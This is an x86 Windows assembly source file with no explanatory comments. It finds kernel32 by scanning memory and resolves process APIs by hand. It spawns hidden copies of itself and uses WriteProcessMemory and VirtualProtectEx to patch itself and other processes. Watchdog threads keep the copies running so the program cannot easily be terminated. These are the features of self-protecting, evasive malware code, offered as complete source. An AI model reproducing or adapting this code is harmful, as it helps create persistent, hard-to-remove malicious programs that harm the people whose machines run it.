SECTION .data

s_main dd 'main.exe  W    ', 0
s_zero_zone dd 'Zero_Zone', 0
s_shell32 dd 'Shell32.dll', 0
s_ntdll dd 'ntdll.dll', 0
s_kernelbase32 dd 'kernelbase.dll', 0
s_kernel dd 'kernel32.dll', 0
s_apphelp dd 'apphelp.dll', 0

s_CreateProcessA dd 'CreateProcessA', 0
s_WriteConsole dd 'WriteConsoleA', 0
s_GetStdHandle dd 'GetStdHandle', 0
s_Sleep dd 'Sleep', 0
s_FreeLibrary dd 'FreeLibrary',0
s_GetModuleHandle dd 'GetModuleHandleA',0
s_GetCommandLineA dd 'GetCommandLineA', 0
s_HeapAlloc dd 'HeapAlloc',0
s_HeapCreate dd 'HeapCreate', 0
s_WaitForSingleObject dd 'WaitForSingleObject',0
s_OpenProcess dd 'OpenProcess',0
s_GetCurrentProcessId dd 'GetCurrentProcessId',0
s_WriteProcessMemory dd 'WriteProcessMemory',0
s_VirtualProtect dd 'VirtualProtectEx',0
s_TerminateProcess dd 'TerminateProcess',0
s_SetEvent dd 'SetEvent',0
s_CloseHandle dd 'CloseHandle',0
s_CreateThread dd 'CreateThread',0

GetModuleHandle: dd 0 
CreateProcessA: dd 0 
WriteConsole: dd 0
GetStdHandle: dd 0
Sleep: dd 0
FreeLibrary: dd 0
LoadLibraryEX: dd 0
GetCommandLineA: dd 0
HeapAlloc: dd 0
HeapCreate: dd 0
WaitForSingleObject: dd 0
OpenProcess: dd 0
GetCurrentProcessId: dd 0
WriteProcessMemory: dd 0
VirtualProtect: dd 0
TerminateProcess: dd 0
SetEvent: dd 0
CloseHandle: dd 0
CreateThread: dd 0

get_proc_addr: dd 0 
kernel_module: dd 0 
ntdll_module: dd 0
kernel32_module: dd 0
std_handle: dd 0
main_heap: dd 0
cmd: dd 0
sync_handle: dd 0
thread_handle: dd 0
stub_handle: dd 0

keep_alive:
	push 0xFFFFFFFF
	mov esi, dword [main_heap]
	push dword [esi]
	call [WaitForSingleObject]
	mov dword [sync_handle], 0x1
	ret
	
keep_alive_stub:
	push 0xFFFFFFFF
	mov esi, dword [stub_handle]
	push esi
	call [WaitForSingleObject]
	mov dword [sync_handle], 0x1
	ret	
	
encrypt:
	add eax, 0x2
	xor ebx, ebx
	mov bl, [eax]
	
	lea edx, [esp + 0x47]
	push edx
	push 0x40
	push 0x1000
	push 0x400000
	push ebx
	call [VirtualProtect]
	
	push 0
	push 0x999
	push main_heap
	push 0x400000
	push ebx
	call [WriteProcessMemory]
	
	lea edx, [esp + 0x47]
	push edx
	push 0x40
	push 0x1000
	push dword [kernel_module]
	push ebx
	call [VirtualProtect]	
	
	lea edx, [esp + 0x47]
	push edx
	push 0x40
	push 0x1000
	push dword [ntdll_module]
	push ebx
	call [VirtualProtect]
	ret

SECTION .ZERO EXEC WRITE ALIGN=16
	global main
	main:
	
	mov eax, [esp]
	xor al, al
	
	continue:
	sub eax, 0x4
	cmp dword [eax], 0x00905A4D ;M
	jne continue
	
	mov dword [kernel_module], eax
	add eax, 0x10000

	add eax, 0xB28
	mov ebx, [eax]
	mov dword [get_proc_addr], ebx
	
	sub eax, 0xB28
	add eax, 0xB3C  ;LoadLibraryEX
	mov ebx, [eax]
	mov dword [LoadLibraryEX], ebx
		
	push s_GetModuleHandle
	push dword [kernel_module]
	call [get_proc_addr]
	mov dword [GetModuleHandle], eax
	
	push s_GetCommandLineA
	push dword [kernel_module]
	call [get_proc_addr]
	mov dword [GetCommandLineA], eax	
	
	push s_OpenProcess
	push dword [kernel_module]
	call [get_proc_addr]
	mov dword [OpenProcess], eax	
	
	push s_WriteProcessMemory
	push dword [kernel_module]
	call [get_proc_addr]
	mov dword [WriteProcessMemory], eax	
	
	push s_VirtualProtect
	push dword [kernel_module]
	call [get_proc_addr]
	mov dword [VirtualProtect], eax		

	push s_GetCurrentProcessId
	push dword [kernel_module]
	call [get_proc_addr]
	mov dword [GetCurrentProcessId], eax		
		
	push s_TerminateProcess
	push dword [kernel_module]
	call [get_proc_addr]
	mov dword [TerminateProcess], eax	
	
	push s_CreateThread
	push dword [kernel_module]
	call [get_proc_addr]
	mov dword [CreateThread], eax	
	
	push s_CloseHandle
	push dword [kernel_module]
	call [get_proc_addr]
	mov dword [CloseHandle], eax
	
	push s_CreateProcessA
	push dword [kernel_module]
	call [get_proc_addr]
	mov dword [CreateProcessA], eax
	
	push s_WaitForSingleObject
	push dword [kernel_module]
	call [get_proc_addr]
	mov dword [WaitForSingleObject], eax	

	push s_FreeLibrary
	push dword [kernel_module]
	call [get_proc_addr]
	mov dword [FreeLibrary], eax		
	
	push s_Sleep
	push dword [kernel_module]
	call [get_proc_addr]
	mov dword [Sleep], eax	
	
	push s_SetEvent
	push dword [kernel_module]
	call [get_proc_addr]
	mov dword [SetEvent], eax		
	
	push s_HeapAlloc
	push dword [kernel_module]
	call [get_proc_addr]
	mov dword [HeapAlloc], eax		
	
	push s_WriteConsole
	push dword [kernel_module]
	call [get_proc_addr]
	mov dword [WriteConsole], eax	
	
	push s_HeapCreate
	push dword [kernel_module]
	call [get_proc_addr]
	mov dword [HeapCreate], eax	
	
	push s_GetStdHandle
	push dword [kernel_module]
	call [get_proc_addr]
	mov dword [GetStdHandle], eax	
	push -11
	call eax
	mov dword [std_handle], eax
	
	; push 0x0
	; push 0x0
	; push 0x9
	; push s_zero_zone
	; push dword [std_handle]
	; call [WriteConsole]
	
	; push 0x00000010
	; push 0x0
	; push s_shell32
	; call [LoadLibraryEX]	
	
	push s_ntdll
	call [GetModuleHandle]
	mov dword [ntdll_module], eax
	
	push s_kernelbase32
	call [GetModuleHandle]
	mov dword [kernel32_module], eax	
		
	push 0x40000
	push 0x21000
	push 0x21000
	call [HeapCreate]
	
	push 0x20000
	push 0x8
	push eax
	call [HeapAlloc]
	mov dword [main_heap], eax	
	
	call [GetCommandLineA]	
	mov dword [cmd], eax
	parse_ext:
	inc eax
	mov bl, [eax]
	cmp bl, 0x2E
	jne parse_ext
	
	cmp byte [eax + 0x5], 0x5A
	jne skip
	mov edx, spoof
	mov dword [edx], 0x5F0C4288
	mov edx, cut
	mov dword [edx], 0xFF899090
	skip:
	
	parse_child:
	mov bl, [eax]
	cmp bl, 0x57
	je payload
	cmp bl, 0
	je protect
	inc eax
	jmp parse_child
	
	protect:
	mov dword [sync_handle], 0x0
		
	call [GetCurrentProcessId]
	push eax
	push 1
	push 0x1F0FFF
	call [OpenProcess]
	mov edx, s_main
	spoof:
	mov byte [edx + 0xB], al	
		
	pop edi
	cmp edi, 0x10000000
	jne con
	xor edx,edx
	mov dl, al
	push 0x1
	push edx
	call [TerminateProcess]
	con:
	cmp edi, 0x20000000
	jne forward
	jmp one_shot
	forward:
		
	mov eax, dword [main_heap]
	push eax
	add eax, 0x10
	mov byte [eax], 0x44
	push eax
	xor ebx, ebx
	push ebx
	push ebx
	push 0x08000000
	push 1
	push ebx
	push ebx
	push s_main
	push ebx
	call [CreateProcessA]
	
	cut:
	jmp unleash
	mov edi,edi
	mov edi, thread_handle
	push edi
	push 0
	push 0
	push keep_alive
	push 0
	push 0
	call [CreateThread]
		
	l:
	
	push 0x1
	call [Sleep]
	cmp dword [sync_handle], 0x1
	je protect
		
	jmp l
	
	unleash:
	push 0x10000000
	jmp protect
	
	exit:
	push 0xFFFFFFFF
	call [Sleep]
	
	payload:
	
	cmp byte [eax + 0x2], 0x20
	jne real_core
	mov edx, s_main
	mov byte [edx + 0x9], 0x5A	
	mov byte [edx + 0xA], 0x0 ; remove W
	jmp protect
	real_core:
		
	cmp byte [eax - 0x1], 0xA5
	je not_one_shot_owner
	mov edx, s_main
	mov byte [edx + 0x9], 0xA5
	jmp next
	not_one_shot_owner:
	call encrypt
	jmp unleash
	next:
	call encrypt
	
	mov edx, main_heap
	mov dword [edx + 0x64], 0x90909090
	mov dword [edx + 0x68], 0x90909090
	lea edx, [edx + 0x64]
	push 0
	push 0x5
	push edx
	push unleash
	push ebx
	call [WriteProcessMemory]	
	
	; mov edx, main_heap
	; mov dword [edx + 0x6C], 0xFFFFFFFF
	; lea edx, [edx + 0x6C]
	; push 0
	; push 0x4
	; push edx
	; push sync_handle
	; push ebx
	; call [WriteProcessMemory]	
		
	mov edi, thread_handle
	mov dword [stub_handle], ebx
	push edi
	push 0
	push 0
	push keep_alive_stub
	push 0
	push 0
	call [CreateThread]
		
	mov edx, spoof
	mov dword [edx], 0x5F0C4288
	mov edx, unleash + 0x4
	mov dword [edx], 0xFF53E920
	jmp protect
	one_shot:
	
	mov edx, spoof
	mov dword [edx], 0x5F0B4288
	mov edx, unleash + 0x4
	mov dword [edx], 0xFF53E910
	mov edx, s_main
	mov byte [edx + 0x9], 0x20	
	mov byte [edx + 0xC], 0x20	
	
	s:
	push 0x1
	call [Sleep]
	cmp dword [sync_handle], 0x1
	je protect
	jmp s
	
	;cmp eax, 1
	;je exit
	
;	add eax, 0xB3C ;load library
;	push 0x00000010
;	push 0x0
;	push shell32
;	call [eax]
	
	
	
	
	int3